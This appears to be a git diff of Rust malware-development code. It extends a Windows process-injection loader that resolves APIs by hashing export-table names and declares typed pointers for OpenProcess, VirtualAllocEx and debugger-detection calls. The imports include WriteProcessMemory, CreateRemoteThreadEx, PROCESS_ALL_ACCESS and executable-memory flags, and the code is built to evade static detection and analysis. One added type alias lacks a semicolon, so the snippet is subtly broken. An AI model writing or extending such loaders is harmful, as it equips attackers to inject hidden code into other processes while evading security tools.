@@ -5,17 +5,40 @@
 use windows::{
     Win32::{
         System::{
-            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE},
             Diagnostics::Debug::{WriteProcessMemory, IsDebuggerPresent, CheckRemoteDebuggerPresent, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT}, 
-            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
+            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE, PROCESS_ACCESS_RIGHTS},
             LibraryLoader::LoadLibraryA,
             SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY},
         },
-        Foundation::{CloseHandle, BOOL, HMODULE},
+        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE},
     },
     core::{PCSTR, Result},
 };
-use std::{ptr::{self, null_mut, null}, process, mem, str, slice};
+use std::{ptr::{self, null_mut, null}, process, mem, str, slice, os::raw::c_void, option::Option};
+
+type xOpenProcess = unsafe extern "system" fn(
+    dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
+    binherithandle: BOOL,
+    dwprocessid: u32
+) -> Result<HANDLE>;
+
+type xCheckRemoteDebuggerPresent = unsafe extern "system" fn(
+    hprocess: HANDLE,
+    pbdebuggerpresent: *mut BOOL
+) -> Result<()>
+
+type xIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;
+
+type xVirtualAllocEx = unsafe extern "system" fn(
+    hprocess: HANDLE,
+    lpaddress: Option<*const c_void>,
+    dwsize: usize,
+    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
+    flprotect: PAGE_PROTECTION_FLAGS
+) -> *mut c_void;
+
+
 
    
 fn getHashFromFunc(funcName: &str) -> u32 {
@@ -90,7 +113,7 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32{
                     if func_name_hash == hash {
                         let func_addr_RVA: *const u32 = addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize);
                         let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
-                        println!("{:?}", func_addr);
+                        println!("[i] address of function {:?}", func_addr);
 
                         return func_addr;
                     }
@@ -106,8 +129,7 @@ fn getFuncAddressByHash(lib: &str, hash: u32) -> *const u32{
             Err(e) => process::exit(-1),
         }
     }
-}
-
+} 
 
 fn main() {
 
